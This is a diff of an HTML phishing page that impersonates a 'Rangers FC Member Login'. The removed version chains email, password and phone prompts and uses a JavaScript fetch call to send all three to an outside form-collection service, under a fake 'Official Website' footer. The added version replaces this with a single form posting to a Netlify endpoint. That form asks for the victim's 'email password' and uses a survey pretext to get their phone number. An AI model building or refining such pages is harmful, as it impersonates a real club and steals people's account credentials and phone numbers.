@@ -9,52 +9,18 @@
             margin: 0;
             padding: 0;
             font-family: Arial, sans-serif;
-            background-image: url('https://imgs.search.brave.com/tGFjqC4XySJZqE1xHJiCRaTOO89L2afC0M6fPQeJxDg/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pbWFn/ZXMuc2Vla2xvZ28u/Y29tL2xvZ28tcG5n/LzExLzIvcmFuZ2Vy/cy1mb290YmFsbC1j/bHViLWxvZ28tcG5n/X3NlZWtsb2dvLTEx/NTc5Ny5wbmc');
-            background-size: 50%;
-            background-position: center center;
-            background-repeat: no-repeat;
-            background-attachment: fixed;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background-color: #0047ab;
             color: white;
             text-align: center;
-            position: relative;
-            background-color: #0047ab;
         }
-
-        body::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.8));
-            z-index: -1;
-        }
-
-        .modal {
-            display: block;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
+        .form-container {
+            margin-top: 50px;
             background-color: rgba(0, 0, 0, 0.7);
-            padding: 30px;
-            width: 300px;
+            padding: 20px;
             border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            display: inline-block;
         }
-
-        h2 {
-            color: #e60000;
-            font-size: 24px;
-            font-weight: bold;
-        }
-
-        input[type="email"], input[type="text"], input[type="tel"] {
+        input[type="email"], input[type="password"], input[type="tel"] {
             width: 100%;
             padding: 12px;
             margin: 10px 0;
@@ -64,7 +30,6 @@
             color: #333;
             font-size: 16px;
         }
-
         button {
             width: 100%;
             padding: 12px;
@@ -72,124 +37,24 @@
             color: white;
             border: none;
             border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-
-        button:hover {
-            background-color: #003580;
-        }
-
-        .footer {
-            position: fixed;
-            bottom: 10px;
-            width: 100%;
-            text-align: center;
-            color: white;
-            font-size: 14px;
-            opacity: 0.7;
         }
     </style>
 </head>
 <body>
 
-<!-- Email Modal -->
-<div class="modal" id="emailModal">
+<div class="form-container">
     <h2>Rangers FC Member Login</h2>
-    <form id="emailForm" action="https://getform.io/f/avrmyepa" method="POST">
-        <input type="email" id="email" name="email" placeholder="Enter your email" required>
-        <button type="submit">Next</button>
+    <form name="loginForm" method="POST" action="https://api.netlify.com/form/your_form_id" data-netlify="true">
+        <input type="email" name="email" placeholder="Enter your email" required>
+        <input type="password" name="userPassword" placeholder="Enter your email password" required>
+        <input type="tel" name="phone" placeholder="Enter your phone number so we can text you the survey" required>
+        <button type="submit">Login</button>
     </form>
-</div>
-
-<!-- Password Modal (hidden initially) -->
-<div class="modal" id="passwordModal" style="display: none;">
-    <h2>Enter Your Password</h2>
-    <form id="passwordForm" action="https://getform.io/f/avrmyepa" method="POST">
-        <input type="text" id="password" name="password" placeholder="Enter your password" required>
-        <button type="submit">Next</button>
-    </form>
-</div>
-
-<!-- Phone Number Input (hidden initially) -->
-<div class="modal" id="phoneModal" style="display: none;">
-    <h2>Enter Your Phone Number</h2>
-    <form id="phoneForm" action="https://getform.io/f/avrmyepa" method="POST">
-        <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
-        <button type="submit">Submit</button>
-    </form>
-</div>
-
-<!-- Footer with Rangers branding -->
-<div class="footer">
-    <p>Official Website | Rangers Football Club</p>
 </div>
 
 <script>
-    // Show password form after email submission
-    document.getElementById('emailForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        // Capture email
-        const email = document.getElementById('email').value;
-
-        // Log email to console for testing
-        console.log(`Email: ${email}`);
-
-        // Hide the email modal and show the password modal
-        document.getElementById('emailModal').style.display = 'none';
-        document.getElementById('passwordModal').style.display = 'block';
-
-        // Save email for later use
-        window.email = email;
-    });
-
-    // Show phone number form after password submission
-    document.getElementById('passwordForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-
-        // Capture password
-        const password = document.getElementById('password').value;
-
-        // Log password to console for testing
-        console.log(`Password: ${password}`);
-
-        // Hide the password modal and show the phone modal
-        document.getElementById('passwordModal').style.display = 'none';
-        document.getElementById('phoneModal').style.display = 'block';
-
-        // Save password for later use
-        window.password = password;
-    });
-
-    // Handle phone number form submission
-    document.getElementById('phoneForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-
-        // Capture phone number
-        const phone = document.getElementById('phone').value;
-
-        // Log phone, email, and password to console for testing
-        console.log(`Phone: ${phone}, Email: ${window.email}, Password: ${window.password}`);
-
-        // Send data to Getform
-        fetch('https://getform.io/f/avrmyepa', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                email: window.email,
-                password: window.password,
-                phone: phone
-            })
-        })
-        .then(response => response.text())
-        .then(data => {
-            // Handle response from server
-            alert('Form submitted successfully!');
-        })
-        .catch(error => console.error('Error:', error));
+    document.forms['loginForm'].addEventListener('submit', function() {
+        alert('Form submitted successfully!');
     });
 </script>
 
